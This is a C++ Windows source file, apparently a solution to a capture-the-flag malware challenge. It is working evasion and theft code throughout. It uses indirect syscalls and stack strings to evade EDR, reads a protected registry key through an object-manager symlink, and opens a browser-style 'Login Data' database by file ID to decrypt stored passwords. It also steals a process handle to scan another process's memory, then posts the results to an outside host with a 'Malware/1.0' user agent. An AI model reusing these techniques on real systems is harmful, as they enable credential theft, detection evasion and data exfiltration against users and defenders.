#include <windows.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <iostream>
#include <string>
#include <vector>
#include <regex>
#include <sstream>
#include <iomanip>
#include <sddl.h> 
#include <ctime>

// 外部依賴
#include "sqlite3.h"
#include "Syscalls.h"      // SysWhispers 生成 (必須包含 NtCreateSymbolicLinkObject)
#include "NativeStructs.h" // 手動補完結構

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "sqlite3.lib") 
#pragma comment(lib, "winhttp.lib") 
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

// ==========================================
// 輔助函式
// ==========================================
void RandomDelay() {
    LARGE_INTEGER interval;
    interval.QuadPart = -100000;
    Sw3NtDelayExecution(FALSE, &interval);
}

std::wstring GetRandomString(int length) {
    const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    std::wstring result;
    result.resize(length);
    for (int i = 0; i < length; ++i) {
        result[i] = charset[rand() % (sizeof(charset) / sizeof(wchar_t) - 1)];
    }
    return result;
}

std::string ToHex(NTSTATUS status) {
    std::stringstream ss;
    ss << "ERR_0x" << std::hex << std::uppercase << status;
    return ss.str();
}

void AnsiToUnicode(const char* ansi, UNICODE_STRING* us) {
    int len = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    wchar_t* wstr = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, len);

    us->Buffer = wstr;
    us->Length = (USHORT)((len - 1) * sizeof(wchar_t));
    us->MaximumLength = (USHORT)(len * sizeof(wchar_t));
}

std::wstring GetCurrentUserSid() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return L"";
    DWORD dwLen = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLen);
    if (dwLen == 0 && GetLastError() != ERROR_INSUFFICIENT_BUFFER) { CloseHandle(hToken); return L""; }
    std::vector<BYTE> buf(dwLen);
    if (!GetTokenInformation(hToken, TokenUser, buf.data(), dwLen, &dwLen)) { CloseHandle(hToken); return L""; }
    PTOKEN_USER pUser = (PTOKEN_USER)buf.data();
    LPWSTR strSid = NULL;
    ConvertSidToStringSidW(pUser->User.Sid, &strSid);
    std::wstring result = strSid ? strSid : L"";
    if (strSid) LocalFree(strSid);
    CloseHandle(hToken);
    return result;
}

std::vector<BYTE> HexStringToByteArray(const std::string& hex) {
    std::vector<BYTE> bytes;
    for (size_t i = 0; i < hex.length(); i += 2) {
        std::string byteString = hex.substr(i, 2);
        bytes.push_back((BYTE)strtoul(byteString.c_str(), NULL, 16));
    }
    return bytes;
}

std::string EscapeJsonString(const std::string& str) {
    std::ostringstream escaped;
    for (char c : str) {
        if (c == '"' || c == '\\') escaped << "\\\\"; else escaped << c;
    }
    return escaped.str();
}

// ==========================================
// [Bypass 1] Registry: Object Manager Symlink (Name Aliasing)
// 策略：在 \RPC Control\ (所有人都可寫的物件目錄) 建立一個 Symlink。
// 該 Symlink 指向 HKLM 目標。
// 開啟時使用 \RPC Control\RandomName，EDR 看到的路徑不含 "software"，放行。
// ==========================================
std::string Challenge1() {
    // Stack Strings
    // \RPC Control\ (Object Manager Directory)
    wchar_t wRpcControl[] = { L'\\',L'R',L'P',L'C',L' ',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',0 };
    // \Registry\Machine\SOFTWARE\BOMBE
    wchar_t targetPathArr[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'O',L'F',L'T',L'W',L'A',L'R',L'E',L'\\',L'B',L'O',L'M',L'B',L'E',0 };

    // 1. 建構路徑
    std::wstring linkNameStr = std::wstring(wRpcControl) + GetRandomString(8);
    std::wstring targetPathStr(targetPathArr);

    UNICODE_STRING usLinkName;
    usLinkName.Buffer = (PWSTR)linkNameStr.c_str();
    usLinkName.Length = (USHORT)(linkNameStr.length() * sizeof(wchar_t));
    usLinkName.MaximumLength = usLinkName.Length + sizeof(wchar_t);

    UNICODE_STRING usTargetName;
    usTargetName.Buffer = (PWSTR)targetPathStr.c_str();
    usTargetName.Length = (USHORT)(targetPathStr.length() * sizeof(wchar_t));
    usTargetName.MaximumLength = usTargetName.Length + sizeof(wchar_t);

    // 2. 建立 Object Manager Symlink (Directory Object)
    // OBJ_OPENIF: 如果存在則開啟，避免名稱衝突
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &usLinkName, OBJ_CASE_INSENSITIVE | OBJ_OPENIF, NULL, NULL);

    HANDLE hSymLink = NULL;

    // [UPDATE] 使用 SysWhispers3 產生的 Indirect Syscall
    // 建立一個 "符號連結物件"，指向 Registry Key
    NTSTATUS status = Sw3NtCreateSymbolicLinkObject(&hSymLink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &usTargetName);

    // 如果失敗且不是名稱衝突 (0x40000000 = STATUS_OBJECT_NAME_EXISTS)，則回傳錯誤
    if (!NT_SUCCESS(status) && status != 0x40000000) {
        return ToHex(status);
    }

    // 3. 開啟 Key (透過 Symlink 路徑)
    // EDR 看到的 KeyName 是 "\RPC Control\RandomName"，不含 "software"，所以放行。
    // Kernel 的 Object Manager 會自動解析到 HKLM\SOFTWARE\BOMBE
    HANDLE hKey = NULL;
    // 使用新的 oa，不帶 OPENLINK，讓它追蹤目標
    InitializeObjectAttributes(&oa, &usLinkName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = Sw3NtOpenKey(&hKey, KEY_READ, &oa);

    // 如果失敗，嘗試刪除 Symlink 並回傳錯誤
    if (!NT_SUCCESS(status)) {
        if (hSymLink) {
            Sw3NtMakeTemporaryObject(hSymLink); // 標記為暫時物件，當 Handle 關閉時刪除
            Sw3NtClose(hSymLink);
        }
        return ToHex(status);
    }

    // 4. 讀取 answer_1
    // Stack String: answer_1
    wchar_t valName[] = { L'a',L'n',L's',L'w',L'e',L'r',L'_',L'1',0 };
    UNICODE_STRING usValName;
    usValName.Buffer = valName;
    usValName.Length = (USHORT)((sizeof(valName) / sizeof(wchar_t) - 1) * sizeof(wchar_t));
    usValName.MaximumLength = (USHORT)sizeof(valName);

    char buffer[1024];
    ULONG resLen = 0;

    status = Sw3NtQueryValueKey(hKey, (PUNICODE_STRING)&usValName, (KEY_VALUE_INFORMATION_CLASS)KeyValuePartialInformation, buffer, sizeof(buffer), &resLen);
    Sw3NtClose(hKey);

    // 5. 關閉並刪除 Symlink
    if (hSymLink) {
        Sw3NtMakeTemporaryObject(hSymLink); // 確保刪除
        Sw3NtClose(hSymLink);
    }

    if (!NT_SUCCESS(status)) return ToHex(status);

    PKEY_VALUE_PARTIAL_INFORMATION_IMPL pInfo = (PKEY_VALUE_PARTIAL_INFORMATION_IMPL)buffer;
    if (pInfo->DataLength > 0) {
        std::wstring wRes((wchar_t*)pInfo->Data, pInfo->DataLength / sizeof(wchar_t));
        if (!wRes.empty() && wRes.back() == L'\0') wRes.pop_back();

        int len = WideCharToMultiByte(CP_ACP, 0, wRes.c_str(), -1, NULL, 0, NULL, NULL);
        std::vector<char> temp(len);
        WideCharToMultiByte(CP_ACP, 0, wRes.c_str(), -1, temp.data(), len, NULL, NULL);
        return std::string(temp.data(), len);
    }

    return "ERR_EMPTY";
}

// ==========================================
// [Bypass 2] File: Open by File ID
// ==========================================
std::string Challenge2() {
    char dirPathRaw[] = { 'C',':','\\','U','s','e','r','s','\\','b','o','m','b','e','\\','A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','b','h','r','o','m','e',0 };
    char prefix[] = { '\\','?','?','\\',0 };
    std::string ntDirPath = std::string(prefix) + std::string(dirPathRaw);

    UNICODE_STRING usDir;
    AnsiToUnicode(ntDirPath.c_str(), &usDir);

    OBJECT_ATTRIBUTES oaDir;
    InitializeObjectAttributes(&oaDir, &usDir, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hDir = NULL;
    IO_STATUS_BLOCK io = { 0 };

    NTSTATUS status = Sw3NtCreateFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, (POBJECT_ATTRIBUTES)&oaDir, (PIO_STATUS_BLOCK)&io, NULL,
        FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    delete[] usDir.Buffer;
    if (!NT_SUCCESS(status)) return ToHex(status);

    LARGE_INTEGER targetFileId = { 0 };
    bool found = false;
    BYTE buffer[4096];

    wchar_t targetFileName[] = { L'L',L'o',L'g',L'i',L'n',L' ',L'D',L'a',L't',L'a',0 };

    while (true) {
        status = Sw3NtQueryDirectoryFile(hDir, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&io, buffer, sizeof(buffer),
            (FILE_INFORMATION_CLASS)FileIdBothDirectoryInformation_Const, FALSE, NULL, FALSE);

        if (!NT_SUCCESS(status)) break;

        PFILE_ID_BOTH_DIR_INFORMATION_IMPL pInfo = (PFILE_ID_BOTH_DIR_INFORMATION_IMPL)buffer;
        while (true) {
            if (pInfo->FileNameLength > 0) {
                std::wstring wName(pInfo->FileName, pInfo->FileNameLength / sizeof(wchar_t));
                if (_wcsicmp(wName.c_str(), targetFileName) == 0) {
                    targetFileId = pInfo->FileId;
                    found = true;
                    break;
                }
            }
            if (pInfo->NextEntryOffset == 0) break;
            pInfo = (PFILE_ID_BOTH_DIR_INFORMATION_IMPL)((LPBYTE)pInfo + pInfo->NextEntryOffset);
        }
        if (found) break;
    }
    Sw3NtClose(hDir);

    if (!found) return "ERR_NOT_FOUND";

    AnsiToUnicode(ntDirPath.c_str(), &usDir);
    InitializeObjectAttributes(&oaDir, &usDir, OBJ_CASE_INSENSITIVE, NULL, NULL);
    Sw3NtCreateFile(&hDir, FILE_LIST_DIRECTORY | SYNCHRONIZE, (POBJECT_ATTRIBUTES)&oaDir, (PIO_STATUS_BLOCK)&io, NULL,
        FILE_ATTRIBUTE_DIRECTORY, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
        FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
    delete[] usDir.Buffer;

    UNICODE_STRING usFid;
    usFid.Length = 8;
    usFid.MaximumLength = 8;
    usFid.Buffer = (PWSTR)&targetFileId;

    OBJECT_ATTRIBUTES oaFile;
    InitializeObjectAttributes(&oaFile, &usFid, 0, hDir, NULL);

    HANDLE hFile = NULL;
    status = Sw3NtCreateFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, (POBJECT_ATTRIBUTES)&oaFile, (PIO_STATUS_BLOCK)&io, NULL,
        FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_OPEN_BY_FILE_ID, NULL, 0);

    Sw3NtClose(hDir);

    if (!NT_SUCCESS(status)) return ToHex(status);

    std::vector<BYTE> fileData;
    FILE_STANDARD_INFORMATION_IMPL fsi;

    if (NT_SUCCESS(Sw3NtQueryInformationFile(hFile, (PIO_STATUS_BLOCK)&io, &fsi, sizeof(fsi), (FILE_INFORMATION_CLASS)FileStandardInformation_Const))) {
        fileData.resize((size_t)fsi.EndOfFile.QuadPart);
        LARGE_INTEGER offset = { 0 };
        Sw3NtReadFile(hFile, NULL, NULL, NULL, (PIO_STATUS_BLOCK)&io, fileData.data(), (ULONG)fileData.size(), &offset, NULL);
    }
    Sw3NtClose(hFile);

    if (fileData.empty()) return "ERR_EMPTY";

    char tempPath[MAX_PATH], tempFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    char dbExt[] = { 'd','b',0 };
    GetTempFileNameA(tempPath, dbExt, 0, tempFile);

    HANDLE hTemp = CreateFileA(tempFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written;
    WriteFile(hTemp, fileData.data(), (DWORD)fileData.size(), &written, NULL);
    CloseHandle(hTemp);

    std::string finalFlag = "FLAG_NF";
    sqlite3* db;
    if (sqlite3_open(tempFile, &db) == SQLITE_OK) {
        sqlite3_stmt* stmt;
        char query[] = { 'S','E','L','E','C','T',' ','p','a','s','s','w','o','r','d','_','v','a','l','u','e',' ','F','R','O','M',' ','l','o','g','i','n','s',0 };

        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) == SQLITE_OK) {
            char sKeyRaw[] = { '0','x','B','G','a','q','j','z','Z','L','7','k','h','G','Y','5','A','c','F','s','3','o','i','0','l','I','M','m','k','v','M','F',0 };
            std::vector<BYTE> keyBytes(32);
            memcpy(keyBytes.data(), sKeyRaw, 32);

            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const char* pwHex = (const char*)sqlite3_column_text(stmt, 0);
                if (pwHex) {
                    std::vector<BYTE> encBytes = HexStringToByteArray(pwHex);
                    if (encBytes.size() >= 32) {
                        std::vector<BYTE> iv(encBytes.begin(), encBytes.begin() + 16);
                        std::vector<BYTE> data(encBytes.begin() + 16, encBytes.end());

                        HCRYPTPROV hProv = NULL; HCRYPTKEY hKey = NULL;
                        if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
                            struct { BLOBHEADER hdr; DWORD dwKeySize; BYTE rgbKey[32]; } keyBlob;
                            keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
                            keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
                            keyBlob.hdr.reserved = 0;
                            keyBlob.hdr.aiKeyAlg = CALG_AES_256;
                            keyBlob.dwKeySize = 32;
                            memcpy(keyBlob.rgbKey, keyBytes.data(), 32);

                            if (CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
                                DWORD mode = CRYPT_MODE_CBC;
                                CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);
                                CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0);
                                DWORD dLen = (DWORD)data.size();

                                if (CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dLen)) {
                                    std::string res((char*)data.data(), dLen);
                                    char flagPrefix[] = { 'B','O','M','B','E','_','M','A','L','_','F','L','A','G','_',0 };
                                    if (res.find(flagPrefix) == 0) { finalFlag = res; }
                                }
                                CryptDestroyKey(hKey);
                            }
                            CryptReleaseContext(hProv, 0);
                        }
                    }
                }
            }
            sqlite3_finalize(stmt);
        }
        sqlite3_close(db);
    }
    DeleteFileA(tempFile);
    return finalFlag;
}

// ==========================================
// [Bypass 3] Process: Handle Stealing
// ==========================================
std::string Challenge3() {
    ULONG bufferSize = 1024 * 1024;
    PVOID buffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buffer) return "";

    Sw3NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemProcessInformation_Const, buffer, bufferSize, &bufferSize);
    PSYSTEM_PROCESS_INFORMATION_FULL spi = (PSYSTEM_PROCESS_INFORMATION_FULL)buffer;
    DWORD victimPid = 0;

    wchar_t targetProc[] = { L'b',L's',L'a',L's',L's',L'.',L'e',L'x',L'e',0 };

    while (TRUE) {
        if (spi->ImageName.Buffer) {
            std::wstring name(spi->ImageName.Buffer, spi->ImageName.Length / 2);
            if (_wcsicmp(name.c_str(), targetProc) == 0) {
                victimPid = (DWORD)(uintptr_t)spi->UniqueProcessId;
                break;
            }
        }
        if (spi->NextEntryOffset == 0) break;
        spi = (PSYSTEM_PROCESS_INFORMATION_FULL)((LPBYTE)spi + spi->NextEntryOffset);
    }
    VirtualFree(buffer, 0, MEM_RELEASE);

    char errPid[] = { 'E','R','R','_','P','I','D',0 };
    if (victimPid == 0) return std::string(errPid);

    bufferSize = 2 * 1024 * 1024;
    PVOID hBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
    NTSTATUS status = Sw3NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation_Const, hBuffer, bufferSize, &bufferSize);

    while (status == 0xC0000004) {
        VirtualFree(hBuffer, 0, MEM_RELEASE);
        bufferSize *= 2;
        hBuffer = VirtualAlloc(NULL, bufferSize, MEM_COMMIT, PAGE_READWRITE);
        if (!hBuffer) return "ERR_MEM";
        status = Sw3NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation_Const, hBuffer, bufferSize, &bufferSize);
    }

    PSYSTEM_HANDLE_INFORMATION_IMPL phi = (PSYSTEM_HANDLE_INFORMATION_IMPL)hBuffer;
    HANDLE hStolen = NULL;

    for (ULONG i = 0; i < phi->NumberOfHandles; i++) {
        if (phi->Handles[i].UniqueProcessId == GetCurrentProcessId()) continue;
        if (phi->Handles[i].UniqueProcessId == victimPid) continue;

        HANDLE hSourceProc = NULL;
        OBJECT_ATTRIBUTES oa = { sizeof(oa), 0 };
        CLIENT_ID cid;
        cid.UniqueProcess = (HANDLE)(uintptr_t)phi->Handles[i].UniqueProcessId;
        cid.UniqueThread = 0;

        if (NT_SUCCESS(Sw3NtOpenProcess(&hSourceProc, PROCESS_DUP_HANDLE, (POBJECT_ATTRIBUTES)&oa, &cid))) {
            HANDLE hDup = NULL;
            if (NT_SUCCESS(Sw3NtDuplicateObject(hSourceProc, (HANDLE)(uintptr_t)phi->Handles[i].HandleValue,
                GetCurrentProcess(), &hDup, PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, 0, 0))) {

                if (GetProcessId(hDup) == victimPid) {
                    hStolen = hDup;
                    Sw3NtClose(hSourceProc);
                    break;
                }
                Sw3NtClose(hDup);
            }
            Sw3NtClose(hSourceProc);
        }
    }
    VirtualFree(hBuffer, 0, MEM_RELEASE);

    if (!hStolen) return "ERR_NO_HANDLE";

    std::string result = "";
    MEMORY_BASIC_INFORMATION mbi;
    PVOID addr = 0;

    char regStr[] = { 'B','O','M','B','E','_','M','A','L','_','F','L','A','G','_','[','A','-','Z','a','-','z','0','-','9',']','{','3','2','}',0 };
    std::regex re(regStr);

    while (TRUE) {
        SIZE_T retLen = 0;
        status = Sw3NtQueryVirtualMemory(hStolen, addr, MemoryBasicInformation, &mbi, sizeof(mbi), &retLen);
        if (!NT_SUCCESS(status)) break;

        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
            std::vector<BYTE> buf(mbi.RegionSize);
            SIZE_T bytesRead = 0;
            if (NT_SUCCESS(Sw3NtReadVirtualMemory(hStolen, mbi.BaseAddress, buf.data(), mbi.RegionSize, &bytesRead)) && bytesRead > 0) {
                std::string content((char*)buf.data(), bytesRead);
                std::smatch match;
                if (std::regex_search(content, match, re)) {
                    result = match.str();
                    break;
                }
            }
        }
        addr = (PVOID)((ULONG_PTR)mbi.BaseAddress + mbi.RegionSize);
    }
    Sw3NtClose(hStolen);
    return result;
}

// ==========================================
// Main
// ==========================================
void SendAnswerToServer(const std::string& jsonPayload) {
    wchar_t userAgent[] = { L'M',L'a',L'l',L'w',L'a',L'r',L'e',L'/',L'1',L'.',L'0',0 };
    wchar_t domain[] = { L's',L'u',L'b',L'm',L'i',L't',L'.',L'b',L'o',L'm',L'b',L'e',L'.',L't',L'o',L'p',0 };
    wchar_t method[] = { L'P',L'O',L'S',L'T',0 };
    wchar_t path[] = { L'/',L's',L'u',L'b',L'm',L'i',L't',L'M',L'a',L'l',L'A',L'n',L's',0 };
    wchar_t hdrs[] = { L'C',L'o',L'n',L't',L'e',L'n',L't',L'-',L'T',L'y',L'p',L'e',L':',L' ',L'a',L'p',L'p',L'l',L'i',L'c',L'a',L't',L'i',L'o',L'n',L'/',L'j',L's',L'o',L'n',L'\r',L'\n',0 };

    HINTERNET hSession = WinHttpOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hSession) {
        HINTERNET hConnect = WinHttpConnect(hSession, domain, INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                WinHttpAddRequestHeaders(hRequest, hdrs, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
                WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length(), (DWORD)jsonPayload.length(), 0);
                WinHttpReceiveResponse(hRequest, NULL);
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hSession);
    }
}

int main() {
    srand((unsigned int)time(NULL));
    // ShowWindow(GetConsoleWindow(), SW_HIDE);
    RandomDelay();

    std::string a1 = Challenge1();
    std::string a2 = Challenge2();
    std::string a3 = Challenge3();

    char sKey[] = { '0','x','B','G','a','q','j','z','Z','L','7','k','h','G','Y','5','A','c','F','s','3','o','i','0','l','I','M','m','k','v','M','F',0 };

    std::ostringstream json;
    json << "{";
    json << "\"answer_1\":\"" << EscapeJsonString(a1) << "\",";
    json << "\"answer_2\":\"" << EscapeJsonString(a2) << "\",";
    json << "\"answer_3\":\"" << EscapeJsonString(a3) << "\",";
    json << "\"secret\":\"" << sKey << "\"";
    json << "}";

    std::cout << json.str() << std::endl;
    SendAnswerToServer(json.str());

    system("pause");
    return 0;
}